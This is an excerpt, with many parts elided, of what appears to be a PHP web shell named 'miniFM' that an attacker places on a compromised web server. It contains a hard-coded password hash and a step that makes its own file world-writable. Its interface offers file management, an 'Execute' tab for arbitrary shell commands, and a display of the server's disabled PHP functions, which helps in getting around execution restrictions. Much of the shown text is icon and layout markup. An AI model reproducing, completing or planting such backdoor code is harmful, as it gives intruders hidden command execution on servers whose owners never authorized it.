...
$auth_pass = '30f5eef91a397e4bbab4d93aeb286aef'; /* a1b */
$stitle = ".:: [ miniFM ] ::.";
...
if(!isset($_SESSION['auth'])){
	@chmod(basename($_SERVER['SCRIPT_FILENAME']), 0777);
	echo "<html>
...
<html lang="en" class="bg-dark h-100">
	<head>
		...
		.fsmall{display:block;font-size:1.75vh; color:#6c757d;}
		...
		<div class="container my-3">
			...
			<nav>
				<div class="nav nav-tabs" id="nav-tab" role="tablist">
					<button class="nav-link active" id="fmanager" data-toggle="tab" data-target="#nav-berkas" type="button" role="tab" aria-controls="nav-berkas" aria-selected="true">
						<svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 576 512" class="d-block d-sm-none"><path fill="#444444" d="M384 480h48c11.4 0 21.9-6 27.6-15.9l112-192c5.8-9.9 5.8-22.1 .1-32.1S555.5 224 544 224H144c-11.4 0-21.9 6-27.6 15.9L48 357.1V96c0-8.8 7.2-16 16-16H181.5c4.2 0 8.3 1.7 11.3 4.7l26.5 26.5c21 21 49.5 32.8 79.2 32.8H416c8.8 0 16 7.2 16 16v32h48V160c0-35.3-28.7-64-64-64H298.5c-17 0-33.3-6.7-45.3-18.7L226.7 50.7c-12-12-28.3-18.7-45.3-18.7H64C28.7 32 0 60.7 0 96V416c0 35.3 28.7 64 64 64H87.7 384z"/></svg>
					...
					<button class="nav-link" data-toggle="tab" data-target="#nav-cmd" type="button" role="tab" aria-controls="nav-cmd" aria-selected="false">
						<svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 576 512" class="d-block d-sm-none"><path fill="#444444" d="M9.4 86.6C-3.1 74.1-3.1 53.9 9.4 41.4s32.8-12.5 45.3 0l192 192c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L178.7 256 9.4 86.6zM256 416H544c17.7 0 32 14.3 32 32s-14.3 32-32 32H256c-17.7 0-32-14.3-32-32s14.3-32 32-32z"/></svg>
						<span class="d-none d-sm-block">Execute</span>
					</button>
					<a class="nav-link text-dark" type="button" href="?act=logout">
						<svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 512 512" class="d-block d-sm-none"><path fill="#444444" d="M377.9 105.9L500.7 228.7c7.2 7.2 11.3 17.1 11.3 27.3s-4.1 20.1-11.3 27.3L377.9 406.1c-6.4 6.4-15 9.9-24 9.9c-18.7 0-33.9-15.2-33.9-33.9l0-62.1-128 0c-17.7 0-32-14.3-32-32l0-64c0-17.7 14.3-32 32-32l128 0 0-62.1c0-18.7 15.2-33.9 33.9-33.9c9 0 17.6 3.6 24 9.9zM160 96L96 96c-17.7 0-32 14.3-32 32l0 256c0 17.7 14.3 32 32 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32l-64 0c-53 0-96-43-96-96L0 128C0 75 43 32 96 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32z"/></svg>
					...
					<form method="post" action="?act=command" class="mb-3" id="requestcmd">
						<div class="row">
							<div class="col-12 mb-3">
								<div class="alert alert-info font-weight-bolder small py-1 px-2">disable_function: <b class="font-weight-lighter"><?php echo is_array(disFunc()) && count(disFunc())>0 ? implode(', ', disFunc()) : "none";?></b></div>
										...
										'<div class="form-group row">'+
											...
											'<div class="col-sm-10">'+
												'<div class="input-group mb-3">'+
													...
													'<div class="input-group-append"><button class="btn btn-outline-secondary" type="submit">GO</button></div>'+
												'</div>'+
											'</div>'+
										'</div>'+
									'</form>';
